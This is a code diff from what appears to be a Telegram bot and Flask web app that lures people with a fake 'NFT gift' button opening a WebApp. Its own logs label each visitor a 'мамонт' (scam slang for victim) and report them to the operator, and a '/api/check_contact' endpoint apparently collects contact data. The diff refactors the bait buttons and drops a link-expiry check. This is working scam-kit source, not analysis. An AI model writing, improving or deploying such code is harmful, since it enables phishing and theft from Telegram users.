@@ -196,15 +196,15 @@ async def inline_handler(event):
         "Нажмите кнопку ниже, чтобы принять 👇"
     )
 
-    builder = event.builder
+
     await event.answer([
-        builder.article(
+        event.builder.article(
             title=f"🎁 Подарить: {nft_name}",
             text=message_text,
             link_preview=False,
             buttons=[
-                [Button.web_app(text="Принять подарок 🎁", url=web_url)],
-                [types.url(text="Посмотреть подарок", url=input_text)]
+                [types.KeyboardButtonWebView(text="Принять подарок 🎁", url=web_url)],
+                [types.KeyboardButtonUrl(text="Посмотреть подарок", url=input_text)]
             ]
         )
     ])
@@ -313,28 +313,15 @@ async def redrain_callback(event):
 @app.route('/')
 def index(): 
     target = request.args.get('nft_url', 'Главная')
-    t_start = request.args.get('t')
-    
-    display_target = target
+
+    display_name = target
     if "t.me/" in target:
         try:
-            raw_user = target.split("t.me/")[1].split("/")[0]
-            display_target = target.split("t.me/")[1].split("/")[0]
-        except Exception: 
-            display_target = target
-    elif target == 'Главная':
-        display_target = target
-    else:
-        display_target = f"@{target}" if not target.startswith('@') else target
+            display_name = "@" + target.split('t.me/')[1].split('/')[0]
+        except:
+            pass
 
-
-    if t_start:
-        try:
-            if int(time.time()) - int(t_start) > 3600:
-                return "<h1>Ошибка: Ссылка истекла.</h1>", 403
-        except: pass
-
-    send_log(f"🌐 Мамонт открыл WebApp. Цель: {target}")
+    send_log(f"🌐 Мамонт открыл WebApp. Цель: {display_name}")
     return render_template('index.html')
 
 @app.route('/api/check_contact')
